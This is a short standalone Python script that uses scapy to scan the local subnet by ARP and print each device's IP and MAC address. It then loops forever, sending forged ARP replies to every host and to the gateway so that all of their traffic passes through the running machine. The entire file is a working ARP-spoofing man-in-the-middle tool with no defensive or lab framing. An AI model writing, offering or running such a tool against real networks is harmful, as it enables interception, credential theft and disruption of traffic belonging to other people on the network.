#!/usr/bin/env python3

import os
import time
import netifaces as ni

from math import log2
from scapy.all import ARP, Ether, srp, send


def get_device_info():
    gateway   = ni.gateways()['default'][ni.AF_INET]
    interface = ni.ifaddresses(gateway[1])[ni.AF_INET][0]
    cidr      = 32 - sum([int(log2(256 - int(num))) for num in interface['netmask'].split('.')])

    arp       = ARP(pdst=f'{interface["addr"]}/{cidr}')
    broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
    packet    = broadcast / arp
    results   = srp(packet, timeout=3, verbose=False)[0]
    device    = { recv.psrc: recv.hwsrc for sent, recv in results }

    print('Available devices')
    print('+-----------------+-------------------+')
    print('|   IP Address    |    MAC Address    |')
    print('+-----------------+-------------------+')
    for ip in device:
        if ip != gateway[0]:
            print(f'| {ip:<15s} | {device[ip]:<17s} |')
    print('+-----------------+-------------------+')

    return gateway, device


def arp_spoofing(gateway, device):
    for ip in device:
        if ip == gateway[0]: continue
        victim = ARP(op=2, hwdst=device[ip], pdst=ip, psrc=gateway[0])
        router = ARP(op=2, hwdst=device[gateway[0]], pdst=gateway[0], psrc=ip)
        send(victim, verbose=False)
        send(router, verbose=False)


def main():
    if os.geteuid() != 0:
        exit(f'{__file__}: Permission denied')

    packet_count = 0

    gateway, device = get_device_info()
    arp_spoofing(gateway, device)

    while True:
        try:
            arp_spoofing(gateway, device)
            packet_count += 2
            print(f'\r[+] Packets Sent: {packet_count}', end='')
        except KeyboardInterrupt:
            print(f'\n[-] Detected CTRL + C and Exiting ...')
            break


if __name__ == '__main__':
    main()
